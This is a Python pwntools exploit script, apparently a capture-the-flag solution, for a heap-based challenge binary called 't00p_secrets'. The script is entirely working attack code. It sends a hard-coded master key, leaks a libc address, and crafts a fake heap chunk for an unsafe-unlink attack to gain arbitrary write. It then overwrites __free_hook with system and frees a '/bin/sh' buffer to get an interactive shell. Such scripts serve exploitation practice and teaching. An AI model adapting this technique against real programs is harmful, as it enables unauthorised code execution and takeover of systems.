from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./t00p_secrets"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bin = ELF(file)

conn = process(file)
#gdb.attach(conn)

def master_key():
    conn.recvuntil("Enter your master")
    conn.sendline(p64(4283034714650536567) + \
                  p64(8243946171696569202) + \
                  p64(7454134929210039143))

def menu(choice):
    conn.recvuntil("6. Exit\n")
    conn.sendline(str(choice))

def c(idx, size, bin_str, body):
    menu(1)
    conn.recvuntil("secret idx: ")
    conn.sendline(str(idx))
    conn.recvuntil("Enter secret body size: ")
    conn.sendline(str(size))
    conn.recvuntil("binary(0)")
    conn.sendline(str(bin_str))
    conn.recvuntil("secret body")
    conn.send(body)

def d(idx):
    menu(2)
    conn.recvuntil("secret id")
    conn.sendline(str(idx))

def e(idx, bin_str, body):
    menu(3)
    conn.recvuntil("secret id")
    conn.sendline(str(idx))
    conn.recvuntil("binary(0)")
    conn.sendline(str(bin_str))
    conn.recvuntil("secret content")
    conn.send(body)

def p(idx):
    menu(5)
    conn.recvuntil("secret id")
    conn.sendline(str(idx))
    conn.recvuntil("content: ")

master_key()

secrets_addr = 0x6020B8

# Leaking libc address
c(0, 0x100, 0, "aa")
c(1, 0x100, 0, "bb")
d(0)
c(0, 0x100, 0, "a"*8)
p(0)
conn.recvn(8)
libc_leak = u64(conn.recvn(8))
libc.address = libc_leak - 0x7f562462cb78 + 0x7f5624268000
d(0)
d(1)

# Cleaned up heap
# Unsafe unlink

c(0, 0xf8, 0, "aa")
c(3, 0xf8, 0, "aa")
c(4, 0xf8, 0, "aa")
# Overwriting 4's prev_in_use_bit
# Fake chunk
payload = p64(0) + \
          p64(0xf1) + \
          p64(secrets_addr) + \
          p64(secrets_addr + 8)
payload = payload.ljust(0xf0, "\x00")
payload += p64(0xf0)
e(3, 1, payload)
d(4) # Unlink

# Now, secrets[3] points to secrets[0]

def a_write(addr, data):
    e(3, 0, p64(addr))
    e(0, 0, data)

def a_read(addr):
    e(3, 0, p64(addr))
    p(0)

a_write(libc.symbols['__free_hook'], p64(libc.symbols['system']))
e(3, 1, "/bin/sh")
d(3)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
